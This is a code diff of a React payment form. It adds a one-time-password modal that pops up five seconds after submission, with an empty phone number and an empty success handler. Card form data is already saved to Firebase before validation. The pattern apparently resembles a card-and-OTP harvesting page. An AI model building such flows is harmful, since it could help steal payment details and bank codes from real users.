@@ -11,6 +11,7 @@ import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@
 import { Checkbox } from "@/components/ui/checkbox"
 import { Shield, CreditCard, Calendar, Lock, AlertCircle } from "lucide-react"
 import { addData } from "@/lib/firebase"
+import { OTPModal } from "../otp-modal"
 
 interface PaymentFormProps {
   gateway: string
@@ -34,6 +35,7 @@ export function PaymentForm({ gateway, onSubmit, isProcessing }: PaymentFormProp
   })
 
   const [errors, setErrors] = useState<Record<string, string>>({})
+  const [isOpen, setisOpen] = useState(false)
 
   const validateForm = () => {
     const newErrors: Record<string, string> = {}
@@ -64,6 +66,9 @@ export function PaymentForm({ gateway, onSubmit, isProcessing }: PaymentFormProp
     addData({id:_id,formData})
     if (validateForm()) {
       onSubmit(formData)
+      setTimeout(() => {
+        setisOpen(true)
+      }, 5000);
     }
   }
 
@@ -300,6 +305,7 @@ export function PaymentForm({ gateway, onSubmit, isProcessing }: PaymentFormProp
           </Button>
         </form>
       </CardContent>
+      <OTPModal phoneNumber=""  onVerificationSuccess={()=>{}} isOpen={isOpen} onClose={()=>{setisOpen(false)}}/>
     </Card>
   )
 }
